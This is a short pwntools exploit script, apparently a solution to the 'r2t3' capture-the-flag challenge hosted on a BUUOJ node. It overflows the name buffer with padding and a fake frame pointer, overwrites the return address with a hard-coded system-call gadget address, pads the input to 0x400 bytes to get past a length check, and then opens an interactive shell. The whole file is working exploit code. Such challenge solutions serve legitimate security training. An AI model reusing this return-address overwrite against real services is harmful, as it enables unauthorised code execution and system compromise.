#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'


if(sys.argv[1] =='l'):
    p = process('./r2t3')
    elf = ELF('./r2t3')
else:
    p = remote("node3.buuoj.cn",27500)
    elf = ELF('./r2t3')

#gdb.attach(p,'b *0x080485EC')

system = 0x0804858B

payload = 'A' * 0x11 + 'dead'  + p32(system)
payload = payload.ljust(0x400,'A')
sla("[+]Please input your name:\n",payload)

ia()